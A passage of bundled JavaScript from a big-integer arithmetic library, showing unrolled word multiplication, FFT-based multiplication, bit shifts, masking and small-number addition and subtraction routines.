                        (lo = (lo + Math.imul(al3, bl4)) | 0),
                        (mid = ((mid = (mid + Math.imul(al3, bh4)) | 0) + Math.imul(ah3, bl4)) | 0),
                        (hi = (hi + Math.imul(ah3, bh4)) | 0),
                        (lo = (lo + Math.imul(al2, bl5)) | 0),
                        (mid = ((mid = (mid + Math.imul(al2, bh5)) | 0) + Math.imul(ah2, bl5)) | 0),
                        (hi = (hi + Math.imul(ah2, bh5)) | 0),
                        (lo = (lo + Math.imul(al1, bl6)) | 0),
                        (mid = ((mid = (mid + Math.imul(al1, bh6)) | 0) + Math.imul(ah1, bl6)) | 0),
                        (hi = (hi + Math.imul(ah1, bh6)) | 0);
                    var w7 = (((c + (lo = (lo + Math.imul(al0, bl7)) | 0)) | 0) + ((8191 & (mid = ((mid = (mid + Math.imul(al0, bh7)) | 0) + Math.imul(ah0, bl7)) | 0)) << 13)) | 0;
                    (c = ((((hi = (hi + Math.imul(ah0, bh7)) | 0) + (mid >>> 13)) | 0) + (w7 >>> 26)) | 0),
                        (w7 &= 67108863),
                        (lo = Math.imul(al8, bl0)),
                        (mid = ((mid = Math.imul(al8, bh0)) + Math.imul(ah8, bl0)) | 0),
                        (hi = Math.imul(ah8, bh0)),
                        (lo = (lo + Math.imul(al7, bl1)) | 0),
                        (mid = ((mid = (mid + Math.imul(al7, bh1)) | 0) + Math.imul(ah7, bl1)) | 0),
                        (hi = (hi + Math.imul(ah7, bh1)) | 0),
                        (lo = (lo + Math.imul(al6, bl2)) | 0),
                        (mid = ((mid = (mid + Math.imul(al6, bh2)) | 0) + Math.imul(ah6, bl2)) | 0),
                        (hi = (hi + Math.imul(ah6, bh2)) | 0),
                        (lo = (lo + Math.imul(al5, bl3)) | 0),
                        (mid = ((mid = (mid + Math.imul(al5, bh3)) | 0) + Math.imul(ah5, bl3)) | 0),
                        (hi = (hi + Math.imul(ah5, bh3)) | 0),
                        (lo = (lo + Math.imul(al4, bl4)) | 0),
                        (mid = ((mid = (mid + Math.imul(al4, bh4)) | 0) + Math.imul(ah4, bl4)) | 0),
                        (hi = (hi + Math.imul(ah4, bh4)) | 0),
                        (lo = (lo + Math.imul(al3, bl5)) | 0),
                        (mid = ((mid = (mid + Math.imul(al3, bh5)) | 0) + Math.imul(ah3, bl5)) | 0),
                        (hi = (hi + Math.imul(ah3, bh5)) | 0),
                        (lo = (lo + Math.imul(al2, bl6)) | 0),
                        (mid = ((mid = (mid + Math.imul(al2, bh6)) | 0) + Math.imul(ah2, bl6)) | 0),
                        (hi = (hi + Math.imul(ah2, bh6)) | 0),
                        (lo = (lo + Math.imul(al1, bl7)) | 0),
                        (mid = ((mid = (mid + Math.imul(al1, bh7)) | 0) + Math.imul(ah1, bl7)) | 0),
                        (hi = (hi + Math.imul(ah1, bh7)) | 0);
                    var w8 = (((c + (lo = (lo + Math.imul(al0, bl8)) | 0)) | 0) + ((8191 & (mid = ((mid = (mid + Math.imul(al0, bh8)) | 0) + Math.imul(ah0, bl8)) | 0)) << 13)) | 0;
                    (c = ((((hi = (hi + Math.imul(ah0, bh8)) | 0) + (mid >>> 13)) | 0) + (w8 >>> 26)) | 0),
                        (w8 &= 67108863),
                        (lo = Math.imul(al9, bl0)),
                        (mid = ((mid = Math.imul(al9, bh0)) + Math.imul(ah9, bl0)) | 0),
                        (hi = Math.imul(ah9, bh0)),
                        (lo = (lo + Math.imul(al8, bl1)) | 0),
                        (mid = ((mid = (mid + Math.imul(al8, bh1)) | 0) + Math.imul(ah8, bl1)) | 0),
                        (hi = (hi + Math.imul(ah8, bh1)) | 0),
                        (lo = (lo + Math.imul(al7, bl2)) | 0),
                        (mid = ((mid = (mid + Math.imul(al7, bh2)) | 0) + Math.imul(ah7, bl2)) | 0),
                        (hi = (hi + Math.imul(ah7, bh2)) | 0),
                        (lo = (lo + Math.imul(al6, bl3)) | 0),
                        (mid = ((mid = (mid + Math.imul(al6, bh3)) | 0) + Math.imul(ah6, bl3)) | 0),
                        (hi = (hi + Math.imul(ah6, bh3)) | 0),
                        (lo = (lo + Math.imul(al5, bl4)) | 0),
                        (mid = ((mid = (mid + Math.imul(al5, bh4)) | 0) + Math.imul(ah5, bl4)) | 0),
                        (hi = (hi + Math.imul(ah5, bh4)) | 0),
                        (lo = (lo + Math.imul(al4, bl5)) | 0),
                        (mid = ((mid = (mid + Math.imul(al4, bh5)) | 0) + Math.imul(ah4, bl5)) | 0),
                        (hi = (hi + Math.imul(ah4, bh5)) | 0),
                        (lo = (lo + Math.imul(al3, bl6)) | 0),
                        (mid = ((mid = (mid + Math.imul(al3, bh6)) | 0) + Math.imul(ah3, bl6)) | 0),
                        (hi = (hi + Math.imul(ah3, bh6)) | 0),
                        (lo = (lo + Math.imul(al2, bl7)) | 0),
                        (mid = ((mid = (mid + Math.imul(al2, bh7)) | 0) + Math.imul(ah2, bl7)) | 0),
                        (hi = (hi + Math.imul(ah2, bh7)) | 0),
                        (lo = (lo + Math.imul(al1, bl8)) | 0),
                        (mid = ((mid = (mid + Math.imul(al1, bh8)) | 0) + Math.imul(ah1, bl8)) | 0),
                        (hi = (hi + Math.imul(ah1, bh8)) | 0);
                    var w9 = (((c + (lo = (lo + Math.imul(al0, bl9)) | 0)) | 0) + ((8191 & (mid = ((mid = (mid + Math.imul(al0, bh9)) | 0) + Math.imul(ah0, bl9)) | 0)) << 13)) | 0;
                    (c = ((((hi = (hi + Math.imul(ah0, bh9)) | 0) + (mid >>> 13)) | 0) + (w9 >>> 26)) | 0),
                        (w9 &= 67108863),
                        (lo = Math.imul(al9, bl1)),
                        (mid = ((mid = Math.imul(al9, bh1)) + Math.imul(ah9, bl1)) | 0),
                        (hi = Math.imul(ah9, bh1)),
                        (lo = (lo + Math.imul(al8, bl2)) | 0),
                        (mid = ((mid = (mid + Math.imul(al8, bh2)) | 0) + Math.imul(ah8, bl2)) | 0),
                        (hi = (hi + Math.imul(ah8, bh2)) | 0),
                        (lo = (lo + Math.imul(al7, bl3)) | 0),
                        (mid = ((mid = (mid + Math.imul(al7, bh3)) | 0) + Math.imul(ah7, bl3)) | 0),
                        (hi = (hi + Math.imul(ah7, bh3)) | 0),
                        (lo = (lo + Math.imul(al6, bl4)) | 0),
                        (mid = ((mid = (mid + Math.imul(al6, bh4)) | 0) + Math.imul(ah6, bl4)) | 0),
                        (hi = (hi + Math.imul(ah6, bh4)) | 0),
                        (lo = (lo + Math.imul(al5, bl5)) | 0),
                        (mid = ((mid = (mid + Math.imul(al5, bh5)) | 0) + Math.imul(ah5, bl5)) | 0),
                        (hi = (hi + Math.imul(ah5, bh5)) | 0),
                        (lo = (lo + Math.imul(al4, bl6)) | 0),
                        (mid = ((mid = (mid + Math.imul(al4, bh6)) | 0) + Math.imul(ah4, bl6)) | 0),
                        (hi = (hi + Math.imul(ah4, bh6)) | 0),
                        (lo = (lo + Math.imul(al3, bl7)) | 0),
                        (mid = ((mid = (mid + Math.imul(al3, bh7)) | 0) + Math.imul(ah3, bl7)) | 0),
                        (hi = (hi + Math.imul(ah3, bh7)) | 0),
                        (lo = (lo + Math.imul(al2, bl8)) | 0),
                        (mid = ((mid = (mid + Math.imul(al2, bh8)) | 0) + Math.imul(ah2, bl8)) | 0),
                        (hi = (hi + Math.imul(ah2, bh8)) | 0);
                    var w10 = (((c + (lo = (lo + Math.imul(al1, bl9)) | 0)) | 0) + ((8191 & (mid = ((mid = (mid + Math.imul(al1, bh9)) | 0) + Math.imul(ah1, bl9)) | 0)) << 13)) | 0;
                    (c = ((((hi = (hi + Math.imul(ah1, bh9)) | 0) + (mid >>> 13)) | 0) + (w10 >>> 26)) | 0),
                        (w10 &= 67108863),
                        (lo = Math.imul(al9, bl2)),
                        (mid = ((mid = Math.imul(al9, bh2)) + Math.imul(ah9, bl2)) | 0),
                        (hi = Math.imul(ah9, bh2)),
                        (lo = (lo + Math.imul(al8, bl3)) | 0),
                        (mid = ((mid = (mid + Math.imul(al8, bh3)) | 0) + Math.imul(ah8, bl3)) | 0),
                        (hi = (hi + Math.imul(ah8, bh3)) | 0),
                        (lo = (lo + Math.imul(al7, bl4)) | 0),
                        (mid = ((mid = (mid + Math.imul(al7, bh4)) | 0) + Math.imul(ah7, bl4)) | 0),
                        (hi = (hi + Math.imul(ah7, bh4)) | 0),
                        (lo = (lo + Math.imul(al6, bl5)) | 0),
                        (mid = ((mid = (mid + Math.imul(al6, bh5)) | 0) + Math.imul(ah6, bl5)) | 0),
                        (hi = (hi + Math.imul(ah6, bh5)) | 0),
                        (lo = (lo + Math.imul(al5, bl6)) | 0),
                        (mid = ((mid = (mid + Math.imul(al5, bh6)) | 0) + Math.imul(ah5, bl6)) | 0),
                        (hi = (hi + Math.imul(ah5, bh6)) | 0),
                        (lo = (lo + Math.imul(al4, bl7)) | 0),
                        (mid = ((mid = (mid + Math.imul(al4, bh7)) | 0) + Math.imul(ah4, bl7)) | 0),
                        (hi = (hi + Math.imul(ah4, bh7)) | 0),
                        (lo = (lo + Math.imul(al3, bl8)) | 0),
                        (mid = ((mid = (mid + Math.imul(al3, bh8)) | 0) + Math.imul(ah3, bl8)) | 0),
                        (hi = (hi + Math.imul(ah3, bh8)) | 0);
                    var w11 = (((c + (lo = (lo + Math.imul(al2, bl9)) | 0)) | 0) + ((8191 & (mid = ((mid = (mid + Math.imul(al2, bh9)) | 0) + Math.imul(ah2, bl9)) | 0)) << 13)) | 0;
                    (c = ((((hi = (hi + Math.imul(ah2, bh9)) | 0) + (mid >>> 13)) | 0) + (w11 >>> 26)) | 0),
                        (w11 &= 67108863),
                        (lo = Math.imul(al9, bl3)),
                        (mid = ((mid = Math.imul(al9, bh3)) + Math.imul(ah9, bl3)) | 0),
                        (hi = Math.imul(ah9, bh3)),
                        (lo = (lo + Math.imul(al8, bl4)) | 0),
                        (mid = ((mid = (mid + Math.imul(al8, bh4)) | 0) + Math.imul(ah8, bl4)) | 0),
                        (hi = (hi + Math.imul(ah8, bh4)) | 0),
                        (lo = (lo + Math.imul(al7, bl5)) | 0),
                        (mid = ((mid = (mid + Math.imul(al7, bh5)) | 0) + Math.imul(ah7, bl5)) | 0),
                        (hi = (hi + Math.imul(ah7, bh5)) | 0),
                        (lo = (lo + Math.imul(al6, bl6)) | 0),
                        (mid = ((mid = (mid + Math.imul(al6, bh6)) | 0) + Math.imul(ah6, bl6)) | 0),
                        (hi = (hi + Math.imul(ah6, bh6)) | 0),
                        (lo = (lo + Math.imul(al5, bl7)) | 0),
                        (mid = ((mid = (mid + Math.imul(al5, bh7)) | 0) + Math.imul(ah5, bl7)) | 0),
                        (hi = (hi + Math.imul(ah5, bh7)) | 0),
                        (lo = (lo + Math.imul(al4, bl8)) | 0),
                        (mid = ((mid = (mid + Math.imul(al4, bh8)) | 0) + Math.imul(ah4, bl8)) | 0),
                        (hi = (hi + Math.imul(ah4, bh8)) | 0);
                    var w12 = (((c + (lo = (lo + Math.imul(al3, bl9)) | 0)) | 0) + ((8191 & (mid = ((mid = (mid + Math.imul(al3, bh9)) | 0) + Math.imul(ah3, bl9)) | 0)) << 13)) | 0;
                    (c = ((((hi = (hi + Math.imul(ah3, bh9)) | 0) + (mid >>> 13)) | 0) + (w12 >>> 26)) | 0),
                        (w12 &= 67108863),
                        (lo = Math.imul(al9, bl4)),
                        (mid = ((mid = Math.imul(al9, bh4)) + Math.imul(ah9, bl4)) | 0),
                        (hi = Math.imul(ah9, bh4)),
                        (lo = (lo + Math.imul(al8, bl5)) | 0),
                        (mid = ((mid = (mid + Math.imul(al8, bh5)) | 0) + Math.imul(ah8, bl5)) | 0),
                        (hi = (hi + Math.imul(ah8, bh5)) | 0),
                        (lo = (lo + Math.imul(al7, bl6)) | 0),
                        (mid = ((mid = (mid + Math.imul(al7, bh6)) | 0) + Math.imul(ah7, bl6)) | 0),
                        (hi = (hi + Math.imul(ah7, bh6)) | 0),
                        (lo = (lo + Math.imul(al6, bl7)) | 0),
                        (mid = ((mid = (mid + Math.imul(al6, bh7)) | 0) + Math.imul(ah6, bl7)) | 0),
                        (hi = (hi + Math.imul(ah6, bh7)) | 0),
                        (lo = (lo + Math.imul(al5, bl8)) | 0),
                        (mid = ((mid = (mid + Math.imul(al5, bh8)) | 0) + Math.imul(ah5, bl8)) | 0),
                        (hi = (hi + Math.imul(ah5, bh8)) | 0);
                    var w13 = (((c + (lo = (lo + Math.imul(al4, bl9)) | 0)) | 0) + ((8191 & (mid = ((mid = (mid + Math.imul(al4, bh9)) | 0) + Math.imul(ah4, bl9)) | 0)) << 13)) | 0;
                    (c = ((((hi = (hi + Math.imul(ah4, bh9)) | 0) + (mid >>> 13)) | 0) + (w13 >>> 26)) | 0),
                        (w13 &= 67108863),
                        (lo = Math.imul(al9, bl5)),
                        (mid = ((mid = Math.imul(al9, bh5)) + Math.imul(ah9, bl5)) | 0),
                        (hi = Math.imul(ah9, bh5)),
                        (lo = (lo + Math.imul(al8, bl6)) | 0),
                        (mid = ((mid = (mid + Math.imul(al8, bh6)) | 0) + Math.imul(ah8, bl6)) | 0),
                        (hi = (hi + Math.imul(ah8, bh6)) | 0),
                        (lo = (lo + Math.imul(al7, bl7)) | 0),
                        (mid = ((mid = (mid + Math.imul(al7, bh7)) | 0) + Math.imul(ah7, bl7)) | 0),
                        (hi = (hi + Math.imul(ah7, bh7)) | 0),
                        (lo = (lo + Math.imul(al6, bl8)) | 0),
                        (mid = ((mid = (mid + Math.imul(al6, bh8)) | 0) + Math.imul(ah6, bl8)) | 0),
                        (hi = (hi + Math.imul(ah6, bh8)) | 0);
                    var w14 = (((c + (lo = (lo + Math.imul(al5, bl9)) | 0)) | 0) + ((8191 & (mid = ((mid = (mid + Math.imul(al5, bh9)) | 0) + Math.imul(ah5, bl9)) | 0)) << 13)) | 0;
                    (c = ((((hi = (hi + Math.imul(ah5, bh9)) | 0) + (mid >>> 13)) | 0) + (w14 >>> 26)) | 0),
                        (w14 &= 67108863),
                        (lo = Math.imul(al9, bl6)),
                        (mid = ((mid = Math.imul(al9, bh6)) + Math.imul(ah9, bl6)) | 0),
                        (hi = Math.imul(ah9, bh6)),
                        (lo = (lo + Math.imul(al8, bl7)) | 0),
                        (mid = ((mid = (mid + Math.imul(al8, bh7)) | 0) + Math.imul(ah8, bl7)) | 0),
                        (hi = (hi + Math.imul(ah8, bh7)) | 0),
                        (lo = (lo + Math.imul(al7, bl8)) | 0),
                        (mid = ((mid = (mid + Math.imul(al7, bh8)) | 0) + Math.imul(ah7, bl8)) | 0),
                        (hi = (hi + Math.imul(ah7, bh8)) | 0);
                    var w15 = (((c + (lo = (lo + Math.imul(al6, bl9)) | 0)) | 0) + ((8191 & (mid = ((mid = (mid + Math.imul(al6, bh9)) | 0) + Math.imul(ah6, bl9)) | 0)) << 13)) | 0;
                    (c = ((((hi = (hi + Math.imul(ah6, bh9)) | 0) + (mid >>> 13)) | 0) + (w15 >>> 26)) | 0),
                        (w15 &= 67108863),
                        (lo = Math.imul(al9, bl7)),
                        (mid = ((mid = Math.imul(al9, bh7)) + Math.imul(ah9, bl7)) | 0),
                        (hi = Math.imul(ah9, bh7)),
                        (lo = (lo + Math.imul(al8, bl8)) | 0),
                        (mid = ((mid = (mid + Math.imul(al8, bh8)) | 0) + Math.imul(ah8, bl8)) | 0),
                        (hi = (hi + Math.imul(ah8, bh8)) | 0);
                    var w16 = (((c + (lo = (lo + Math.imul(al7, bl9)) | 0)) | 0) + ((8191 & (mid = ((mid = (mid + Math.imul(al7, bh9)) | 0) + Math.imul(ah7, bl9)) | 0)) << 13)) | 0;
                    (c = ((((hi = (hi + Math.imul(ah7, bh9)) | 0) + (mid >>> 13)) | 0) + (w16 >>> 26)) | 0),
                        (w16 &= 67108863),
                        (lo = Math.imul(al9, bl8)),
                        (mid = ((mid = Math.imul(al9, bh8)) + Math.imul(ah9, bl8)) | 0),
                        (hi = Math.imul(ah9, bh8));
                    var w17 = (((c + (lo = (lo + Math.imul(al8, bl9)) | 0)) | 0) + ((8191 & (mid = ((mid = (mid + Math.imul(al8, bh9)) | 0) + Math.imul(ah8, bl9)) | 0)) << 13)) | 0;
                    (c = ((((hi = (hi + Math.imul(ah8, bh9)) | 0) + (mid >>> 13)) | 0) + (w17 >>> 26)) | 0), (w17 &= 67108863);
                    var w18 = (((c + (lo = Math.imul(al9, bl9))) | 0) + ((8191 & (mid = ((mid = Math.imul(al9, bh9)) + Math.imul(ah9, bl9)) | 0)) << 13)) | 0;
                    return (
                        (c = ((((hi = Math.imul(ah9, bh9)) + (mid >>> 13)) | 0) + (w18 >>> 26)) | 0),
                        (w18 &= 67108863),
                        (o[0] = w0),
                        (o[1] = w1),
                        (o[2] = w2),
                        (o[3] = w3),
                        (o[4] = w4),
                        (o[5] = w5),
                        (o[6] = w6),
                        (o[7] = w7),
                        (o[8] = w8),
                        (o[9] = w9),
                        (o[10] = w10),
                        (o[11] = w11),
                        (o[12] = w12),
                        (o[13] = w13),
                        (o[14] = w14),
                        (o[15] = w15),
                        (o[16] = w16),
                        (o[17] = w17),
                        (o[18] = w18),
                        0 !== c && ((o[19] = c), out.length++),
                        out
                    );
                };
                function jumboMulTo(self, num, out) {
                    return new FFTM().mulp(self, num, out);
                }
                function FFTM(x, y) {
                    (this.x = x), (this.y = y);
                }
                Math.imul || (comb10MulTo = smallMulTo),
                    (BN.prototype.mulTo = function (num, out) {
                        var len = this.length + num.length;
                        return 10 === this.length && 10 === num.length
                            ? comb10MulTo(this, num, out)
                            : len < 63
                            ? smallMulTo(this, num, out)
                            : len < 1024
                            ? (function (self, num, out) {
                                  (out.negative = num.negative ^ self.negative), (out.length = self.length + num.length);
                                  for (var carry = 0, hncarry = 0, k = 0; k < out.length - 1; k++) {
                                      var ncarry = hncarry;
                                      hncarry = 0;
                                      for (var rword = 67108863 & carry, maxJ = Math.min(k, num.length - 1), j = Math.max(0, k - self.length + 1); j <= maxJ; j++) {
                                          var i = k - j,
                                              r = (0 | self.words[i]) * (0 | num.words[j]),
                                              lo = 67108863 & r;
                                          (rword = 67108863 & (lo = (lo + rword) | 0)), (hncarry += (ncarry = ((ncarry = (ncarry + ((r / 67108864) | 0)) | 0) + (lo >>> 26)) | 0) >>> 26), (ncarry &= 67108863);
                                      }
                                      (out.words[k] = rword), (carry = ncarry), (ncarry = hncarry);
                                  }
                                  return 0 !== carry ? (out.words[k] = carry) : out.length--, out.strip();
                              })(this, num, out)
                            : jumboMulTo(this, num, out);
                    }),
                    (FFTM.prototype.makeRBT = function (N) {
                        for (var t = new Array(N), l = BN.prototype._countBits(N) - 1, i = 0; i < N; i++) t[i] = this.revBin(i, l, N);
                        return t;
                    }),
                    (FFTM.prototype.revBin = function (x, l, N) {
                        if (0 === x || x === N - 1) return x;
                        for (var rb = 0, i = 0; i < l; i++) (rb |= (1 & x) << (l - i - 1)), (x >>= 1);
                        return rb;
                    }),
                    (FFTM.prototype.permute = function (rbt, rws, iws, rtws, itws, N) {
                        for (var i = 0; i < N; i++) (rtws[i] = rws[rbt[i]]), (itws[i] = iws[rbt[i]]);
                    }),
                    (FFTM.prototype.transform = function (rws, iws, rtws, itws, N, rbt) {
                        this.permute(rbt, rws, iws, rtws, itws, N);
                        for (var s = 1; s < N; s <<= 1)
                            for (var l = s << 1, rtwdf = Math.cos((2 * Math.PI) / l), itwdf = Math.sin((2 * Math.PI) / l), p = 0; p < N; p += l)
                                for (var rtwdf_ = rtwdf, itwdf_ = itwdf, j = 0; j < s; j++) {
                                    var re = rtws[p + j],
                                        ie = itws[p + j],
                                        ro = rtws[p + j + s],
                                        io = itws[p + j + s],
                                        rx = rtwdf_ * ro - itwdf_ * io;
                                    (io = rtwdf_ * io + itwdf_ * ro),
                                        (ro = rx),
                                        (rtws[p + j] = re + ro),
                                        (itws[p + j] = ie + io),
                                        (rtws[p + j + s] = re - ro),
                                        (itws[p + j + s] = ie - io),
                                        j !== l && ((rx = rtwdf * rtwdf_ - itwdf * itwdf_), (itwdf_ = rtwdf * itwdf_ + itwdf * rtwdf_), (rtwdf_ = rx));
                                }
                    }),
                    (FFTM.prototype.guessLen13b = function (n, m) {
                        var N = 1 | Math.max(m, n),
                            odd = 1 & N,
                            i = 0;
                        for (N = (N / 2) | 0; N; N >>>= 1) i++;
                        return 1 << (i + 1 + odd);
                    }),
                    (FFTM.prototype.conjugate = function (rws, iws, N) {
                        if (!(N <= 1))
                            for (var i = 0; i < N / 2; i++) {
                                var t = rws[i];
                                (rws[i] = rws[N - i - 1]), (rws[N - i - 1] = t), (t = iws[i]), (iws[i] = -iws[N - i - 1]), (iws[N - i - 1] = -t);
                            }
                    }),
                    (FFTM.prototype.normalize13b = function (ws, N) {
                        for (var carry = 0, i = 0; i < N / 2; i++) {
                            var w = 8192 * Math.round(ws[2 * i + 1] / N) + Math.round(ws[2 * i] / N) + carry;
                            (ws[i] = 67108863 & w), (carry = w < 67108864 ? 0 : (w / 67108864) | 0);
                        }
                        return ws;
                    }),
                    (FFTM.prototype.convert13b = function (ws, len, rws, N) {
                        for (var carry = 0, i = 0; i < len; i++) (carry += 0 | ws[i]), (rws[2 * i] = 8191 & carry), (carry >>>= 13), (rws[2 * i + 1] = 8191 & carry), (carry >>>= 13);
                        for (i = 2 * len; i < N; ++i) rws[i] = 0;
                        assert(0 === carry), assert(0 == (-8192 & carry));
                    }),
                    (FFTM.prototype.stub = function (N) {
                        for (var ph = new Array(N), i = 0; i < N; i++) ph[i] = 0;
                        return ph;
                    }),
                    (FFTM.prototype.mulp = function (x, y, out) {
                        var N = 2 * this.guessLen13b(x.length, y.length),
                            rbt = this.makeRBT(N),
                            _ = this.stub(N),
                            rws = new Array(N),
                            rwst = new Array(N),
                            iwst = new Array(N),
                            nrws = new Array(N),
                            nrwst = new Array(N),
                            niwst = new Array(N),
                            rmws = out.words;
                        (rmws.length = N), this.convert13b(x.words, x.length, rws, N), this.convert13b(y.words, y.length, nrws, N), this.transform(rws, _, rwst, iwst, N, rbt), this.transform(nrws, _, nrwst, niwst, N, rbt);
                        for (var i = 0; i < N; i++) {
                            var rx = rwst[i] * nrwst[i] - iwst[i] * niwst[i];
                            (iwst[i] = rwst[i] * niwst[i] + iwst[i] * nrwst[i]), (rwst[i] = rx);
                        }
                        return (
                            this.conjugate(rwst, iwst, N),
                            this.transform(rwst, iwst, rmws, _, N, rbt),
                            this.conjugate(rmws, _, N),
                            this.normalize13b(rmws, N),
                            (out.negative = x.negative ^ y.negative),
                            (out.length = x.length + y.length),
                            out.strip()
                        );
                    }),
                    (BN.prototype.mul = function (num) {
                        var out = new BN(null);
                        return (out.words = new Array(this.length + num.length)), this.mulTo(num, out);
                    }),
                    (BN.prototype.mulf = function (num) {
                        var out = new BN(null);
                        return (out.words = new Array(this.length + num.length)), jumboMulTo(this, num, out);
                    }),
                    (BN.prototype.imul = function (num) {
                        return this.clone().mulTo(num, this);
                    }),
                    (BN.prototype.imuln = function (num) {
                        assert("number" == typeof num), assert(num < 67108864);
                        for (var carry = 0, i = 0; i < this.length; i++) {
                            var w = (0 | this.words[i]) * num,
                                lo = (67108863 & w) + (67108863 & carry);
                            (carry >>= 26), (carry += (w / 67108864) | 0), (carry += lo >>> 26), (this.words[i] = 67108863 & lo);
                        }
                        return 0 !== carry && ((this.words[i] = carry), this.length++), this;
                    }),
                    (BN.prototype.muln = function (num) {
                        return this.clone().imuln(num);
                    }),
                    (BN.prototype.sqr = function () {
                        return this.mul(this);
                    }),
                    (BN.prototype.isqr = function () {
                        return this.imul(this.clone());
                    }),
                    (BN.prototype.pow = function (num) {
                        var w = (function (num) {
                            for (var w = new Array(num.bitLength()), bit = 0; bit < w.length; bit++) {
                                var off = (bit / 26) | 0,
                                    wbit = bit % 26;
                                w[bit] = (num.words[off] & (1 << wbit)) >>> wbit;
                            }
                            return w;
                        })(num);
                        if (0 === w.length) return new BN(1);
                        for (var res = this, i = 0; i < w.length && 0 === w[i]; i++, res = res.sqr());
                        if (++i < w.length) for (var q = res.sqr(); i < w.length; i++, q = q.sqr()) 0 !== w[i] && (res = res.mul(q));
                        return res;
                    }),
                    (BN.prototype.iushln = function (bits) {
                        assert("number" == typeof bits && bits >= 0);
                        var i,
                            r = bits % 26,
                            s = (bits - r) / 26,
                            carryMask = (67108863 >>> (26 - r)) << (26 - r);
                        if (0 !== r) {
                            var carry = 0;
                            for (i = 0; i < this.length; i++) {
                                var newCarry = this.words[i] & carryMask,
                                    c = ((0 | this.words[i]) - newCarry) << r;
                                (this.words[i] = c | carry), (carry = newCarry >>> (26 - r));
                            }
                            carry && ((this.words[i] = carry), this.length++);
                        }
                        if (0 !== s) {
                            for (i = this.length - 1; i >= 0; i--) this.words[i + s] = this.words[i];
                            for (i = 0; i < s; i++) this.words[i] = 0;
                            this.length += s;
                        }
                        return this.strip();
                    }),
                    (BN.prototype.ishln = function (bits) {
                        return assert(0 === this.negative), this.iushln(bits);
                    }),
                    (BN.prototype.iushrn = function (bits, hint, extended) {
                        var h;
                        assert("number" == typeof bits && bits >= 0), (h = hint ? (hint - (hint % 26)) / 26 : 0);
                        var r = bits % 26,
                            s = Math.min((bits - r) / 26, this.length),
                            mask = 67108863 ^ ((67108863 >>> r) << r),
                            maskedWords = extended;
                        if (((h -= s), (h = Math.max(0, h)), maskedWords)) {
                            for (var i = 0; i < s; i++) maskedWords.words[i] = this.words[i];
                            maskedWords.length = s;
                        }
                        if (0 === s);
                        else if (this.length > s) for (this.length -= s, i = 0; i < this.length; i++) this.words[i] = this.words[i + s];
                        else (this.words[0] = 0), (this.length = 1);
                        var carry = 0;
                        for (i = this.length - 1; i >= 0 && (0 !== carry || i >= h); i--) {
                            var word = 0 | this.words[i];
                            (this.words[i] = (carry << (26 - r)) | (word >>> r)), (carry = word & mask);
                        }
                        return maskedWords && 0 !== carry && (maskedWords.words[maskedWords.length++] = carry), 0 === this.length && ((this.words[0] = 0), (this.length = 1)), this.strip();
                    }),
                    (BN.prototype.ishrn = function (bits, hint, extended) {
                        return assert(0 === this.negative), this.iushrn(bits, hint, extended);
                    }),
                    (BN.prototype.shln = function (bits) {
                        return this.clone().ishln(bits);
                    }),
                    (BN.prototype.ushln = function (bits) {
                        return this.clone().iushln(bits);
                    }),
                    (BN.prototype.shrn = function (bits) {
                        return this.clone().ishrn(bits);
                    }),
                    (BN.prototype.ushrn = function (bits) {
                        return this.clone().iushrn(bits);
                    }),
                    (BN.prototype.testn = function (bit) {
                        assert("number" == typeof bit && bit >= 0);
                        var r = bit % 26,
                            s = (bit - r) / 26,
                            q = 1 << r;
                        return !(this.length <= s) && !!(this.words[s] & q);
                    }),
                    (BN.prototype.imaskn = function (bits) {
                        assert("number" == typeof bits && bits >= 0);
                        var r = bits % 26,
                            s = (bits - r) / 26;
                        if ((assert(0 === this.negative, "imaskn works only with positive numbers"), this.length <= s)) return this;
                        if ((0 !== r && s++, (this.length = Math.min(s, this.length)), 0 !== r)) {
                            var mask = 67108863 ^ ((67108863 >>> r) << r);
                            this.words[this.length - 1] &= mask;
                        }
                        return this.strip();
                    }),
                    (BN.prototype.maskn = function (bits) {
                        return this.clone().imaskn(bits);
                    }),
                    (BN.prototype.iaddn = function (num) {
                        return (
                            assert("number" == typeof num),
                            assert(num < 67108864),
                            num < 0
                                ? this.isubn(-num)
                                : 0 !== this.negative
                                ? 1 === this.length && (0 | this.words[0]) < num
                                    ? ((this.words[0] = num - (0 | this.words[0])), (this.negative = 0), this)
                                    : ((this.negative = 0), this.isubn(num), (this.negative = 1), this)
                                : this._iaddn(num)
                        );
                    }),
                    (BN.prototype._iaddn = function (num) {
                        this.words[0] += num;
                        for (var i = 0; i < this.length && this.words[i] >= 67108864; i++) (this.words[i] -= 67108864), i === this.length - 1 ? (this.words[i + 1] = 1) : this.words[i + 1]++;
                        return (this.length = Math.max(this.length, i + 1)), this;
                    }),
                    (BN.prototype.isubn = function (num) {
                        if ((assert("number" == typeof num), assert(num < 67108864), num < 0)) return this.iaddn(-num);
                        if (0 !== this.negative) return (this.negative = 0), this.iaddn(num), (this.negative = 1), this;
                        if (((this.words[0] -= num), 1 === this.length && this.words[0] < 0)) (this.words[0] = -this.words[0]), (this.negative = 1);
                        else for (var i = 0; i < this.length && this.words[i] < 0; i++) (this.words[i] += 67108864), (this.words[i + 1] -= 1);
                        return this.strip();
                    }),
                    (BN.prototype.addn = function (num) {
                        return this.clone().iaddn(num);
                    }),
                    (BN.prototype.subn = function (num) {
                        return this.clone().isubn(num);
                    }),
                    (BN.prototype.iabs = function () {
                        return (this.negative = 0), this;
                    }),
                    (BN.prototype.abs = function () {
                        return this.clone().iabs();
                    }),
                    (BN.prototype._ishlnsubmul = function (num, mul, shift) {
                        var i,
                            w,
                            len = num.length + shift;
                        this._expand(len);
                        var carry = 0;
                        for (i = 0; i < num.length; i++) {
                            w = (0 | this.words[i + shift]) + carry;
                            var right = (0 | num.words[i]) * mul;
                            (carry = ((w -= 67108863 & right) >> 26) - ((right / 67108864) | 0)), (this.words[i + shift] = 67108863 & w);
                        }
                        for (; i < this.length - shift; i++) (carry = (w = (0 | this.words[i + shift]) + carry) >> 26), (this.words[i + shift] = 67108863 & w);
                        if (0 === carry) return this.strip();
                        for (assert(-1 === carry), carry = 0, i = 0; i < this.length; i++) (carry = (w = -(0 | this.words[i]) + carry) >> 26), (this.words[i] = 67108863 & w);
                        return (this.negative = 1), this.strip();
                    }),
                    (BN.prototype._wordDiv = function (num, mode) {
                        var shift = (this.length, num.length),
                            a = this.clone(),
                            b = num,
                            bhi = 0 | b.words[b.length - 1];
                        0 !== (shift = 26 - this._countBits(bhi)) && ((b = b.ushln(shift)), a.iushln(shift), (bhi = 0 | b.words[b.length - 1]));
                        var q,
                            m = a.length - b.length;
                        if ("mod" !== mode) {
